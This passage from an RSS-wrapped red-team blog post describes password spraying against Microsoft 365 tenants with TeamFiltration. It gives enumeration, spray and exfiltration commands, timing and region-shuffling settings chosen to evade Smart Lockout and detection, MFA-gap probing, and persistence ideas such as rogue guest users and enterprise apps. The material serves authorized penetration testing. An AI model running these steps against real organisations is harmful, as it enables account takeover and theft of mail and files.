      &amp;#34;AwsRegions&amp;#34;:[&amp;#34;us-east-1&amp;#34;, &amp;#34;us-west-1&amp;#34;, &amp;#34;us-west-2&amp;#34;, &amp;#34;ca-central-1&amp;#34;,...]
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;User Enumeration&lt;span class=&#34;absolute -mt-20&#34; id=&#34;user-enumeration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#user-enumeration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Refer to Flangvik&amp;rsquo;s video on nuances in enumerating users with Teamfiltration, but the base options with &lt;code&gt;--validate-teams&lt;/code&gt; worked well for us:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig_client.json --enum --usernames ./names.txt --validate-teams --outpath ./TF&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;code&gt;--outpath ~/clientA/TF&lt;/code&gt; - this means the results of the enumeration is saved in a database file in the stated path, which the subsequent steps would use.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic5.png&#34; title=&#34;pic5&#34; alt=&#34;pic5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic5&lt;/figcaption&gt;
  &lt;/figure&gt; User enum in action on an engagement.&lt;/p&gt;
&lt;h3&gt;Password Spraying&lt;span class=&#34;absolute -mt-20&#34; id=&#34;password-spraying&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#password-spraying&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig.json --outpath ./TF --spray --sleep-min 75 --sleep-max 90 --jitter 10 --shuffle-users --shuffle-regions --exclude exclude.txt --common-only&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic6.png&#34; title=&#34;pic6&#34; alt=&#34;pic6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;As previously explained, our goal is to not trigger Smart Lockout so that a correct credential set would get us either &amp;ldquo;Access Granted&amp;rdquo; or &amp;ldquo;MFA required&amp;rdquo; returns messages, instead of the &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; error message. What has been found to work for us are these settings:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--shuffle-regions&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;This seemed to be the most important, as you can see TF creates roughly 10 Fireprox endpoints in the regions you defined in the TF profile. By shuffling regions, each request comes from a different AWS georegion and the sequence is also shuffled. &lt;code&gt;--shuffle users&lt;/code&gt; is to change the sequence of users being sprayed. It did not seem to affect detection but I like to keep it on too.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--sleep-min&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;and &lt;code&gt;--sleep-max&lt;/code&gt;: It is also critical to space out your spraying rounds as this defines the min/max time interval (in minutes) between which each user is attempted again. The time is randomised a bit between the 2 values to not look regular to MS. Somewhere around 1 hour per round worked for us.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--jitter&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;it defines the time (in seconds) within one round, between trying a password against any 2 users. Against there is some randomised variability to not look like a bot to MS.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--exclude&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; error message is something expected to appear in a small % of users (up to 5 or even 10%), even in the first spraying round. You can try to exclude these users in subsequent rounds, or not. Sometimes &lt;code&gt;AADESTS50053&lt;/code&gt; locked user(s) are observed to unlock on subsequent rounds so it&amp;rsquo;s not the end of the world as long as the % remains small and the client is in the loop of your actions.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--common-only&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Tries the &amp;ldquo;commonly observed&amp;rdquo; passwords the author defined in the source code. Of course you can use your own but these are quite good actually.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&amp;rsquo;s say your spraying went well and you found valid credentials, then you would be given the choice by the tool to either &lt;code&gt;--exfil&lt;/code&gt; to loot right away, or do it later. I would recommend to do it right away, unless there is a compelling reason not to.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic7.png&#34; title=&#34;pic7&#34; alt=&#34;pic7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;You can also see all the valid credentials you found in prior spraying in the tool.&lt;/p&gt;
&lt;h3&gt;Wait, what about MFA?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;wait-what-about-mfa&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#wait-what-about-mfa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;One reason why password spraying is performed less commonly by security testers against M365 might be the prevalence of multi-factor authentication (MFA), particularly in more mature or regulated clients. At least that was my assumption when learning about all these approaches.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I thought, why password spray an MFA-enabled client? At worst you&amp;rsquo;re going to alert the defenders and at best you can prove that MFA was working as intended to protect people who had weak passwords.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Such was my assumption. What I learned later was that implementing MFA in M365 was not as simple as flipping a switch. Often times, accounts can have missing MFA requirements, for any number of reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application / service accounts that does not support MFA usage.&lt;/li&gt;
&lt;li&gt;New starter who have not gotten their company device to set up MFA on, or&lt;/li&gt;
&lt;li&gt;Leaver accounts not deactivated, from a time when the org haven&amp;rsquo;t implemented MFA yet.&lt;/li&gt;
&lt;li&gt;Legacy applications using M365 OAuth that the business needs, but does not support MFA.&lt;/li&gt;
&lt;li&gt;and so on.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So after you have found a set of valid credentials on Teamfiltration (congrats btw), you can either interactively choose to &lt;code&gt;exfil&lt;/code&gt; immediately or hit &lt;code&gt;--exfil&lt;/code&gt; later to loot. What TF then does is to enumerate all the known platforms and applications with those credentials and see if there are any holes in the MFA implementation.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig.json --outpath ./TF --exfil --all --roadtools ./TF/.roadtools_auth&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;For example, the tool would try trying:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Windows PC - MS Teams - invalid
Mac - MS Teams - invalid
iPhone - MS Teams - invalid
Android - MS Teams - invalid
...
Windows PC - Outlook - invalid
Mac - Outlook - MFA Hole found!
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;When a hole is discovered, the tool goes in, grabs the relevant access and refresh tokens that can possibly be obtained, and then exfiltrates emails, Teams chat log, Sharepoint files and so on. You could also export the tokens to be used in other tools like Roadtools or GraphRunner.&lt;/p&gt;
&lt;p&gt;Tools such as &lt;a href=&#34;https://github.com/dafthack/MFASweep&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MFASweep&lt;/a&gt; does a very similar MFA enumeration to look for an implementation gap, given valid set(s) credentials, for various Microsoft services and platoform combinations.&lt;/p&gt;
&lt;h3&gt;Opsec Concerns &amp;amp; Post Exploitation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;opsec-concerns--post-exploitation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#opsec-concerns--post-exploitation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Being stealthy is crucial for many of us red teamers, so it is reasonable to ask the question of, how loud is sending thousands of login request to a single M365 tenant? The good (and bad) news is, as of 2024, spraying low and slow (as described above) can get past Entra Smart Lockout, and even if there are a couple of &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; errors along the way, the attack itself does not produce a &amp;ldquo;singular&amp;rdquo; &lt;em&gt;We are under attack from a password spray&lt;/em&gt; alert under either MS&amp;rsquo;s Entra ID protection or Defender for M356 by default. The repeated login attempts do appear in the logs if blue team is looking for it, but before you find any valid credentials, you should still be under the radar unless the client has custom detection rules (perhaps, &amp;gt;1k per day failed login attempts for the whole organisation?).&lt;/p&gt;
&lt;p&gt;The second point is more open for discussion, even if the defenders figured out they are under some sort of distributed password spraying attack geolocated around the world, while this might heighten the alertness of the team, there seem to be little that can be done at the moment. A caveat is that as Microsoft themselves were compromised by a distributed password spraying attack, I would not be surprised if they do something soon-ish, but we shall see.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Quoting Nikhil Mittal, a renowned voice in our community, &amp;ldquo;the loudest action you can perform with Azure or M365 in general, is authentication.&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Where you could quite reliably get an alert is when a set of valid credentials are found are used authenticate to perform the post-exploitation steps. So far, the only activity that can be used to verify credentials is using them to login, so the notification on our tooling that &amp;ldquo;valid creds are found&amp;rdquo; should also be treated as alert T+0.&lt;/p&gt;
&lt;p&gt;That is the reason why I recommended running the &lt;code&gt;--exfil&lt;/code&gt;, or performing other post-exploitation actions as soon as you find any set of valid credentials. If the blue team caught on and got the user to reset their password, your hard work so far would have been for naught. On the other hand, our experience with Teamfiltration so far has been that, it takes typically minutes to download thousands of business emails, Team chat logs and hundreds of MiBs of Sharepoint data, so it is definitely worthwhile to do that first for proving impact upfront.&lt;/p&gt;
&lt;h4&gt;Do you have a game plan?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;do-you-have-a-game-plan&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#do-you-have-a-game-plan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Another generic recommendation is to have a generic post-exploitation plan before starting the password spray. It can any of the below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Prepared internal phishing email &amp;amp; payload that you can hit send right away.&lt;/li&gt;
&lt;li&gt;Token-craft - figure out what post-ex tools need what sort of access and/or refresh tokens, and how to get &amp;amp; use them.&lt;/li&gt;
&lt;li&gt;Organisational Persistence with inviting your own M365 users into the client&amp;rsquo;s org as guests, and registering your malicious Enterprise application to retain access even if the compromised user&amp;rsquo;s been burned. GraphRunner is an incredible post-exploitation toolkit for these.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Final word&lt;span class=&#34;absolute -mt-20&#34; id=&#34;final-word&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#final-word&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;All in all, distributed and low-volume password spraying, paired with MFA gap bruteforcing, is a valid and powerful approach for M365 initial access. While it is not expected to get you in for 100% of your clients engagements (For example, some clients have few users, and implement air-tight MFA on all of them. In those cases, social engineering would be a better bet), the approach described would be a valuable addition to most red team&amp;rsquo;s toolkit, especially if the bad guys are using it effectively already.&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
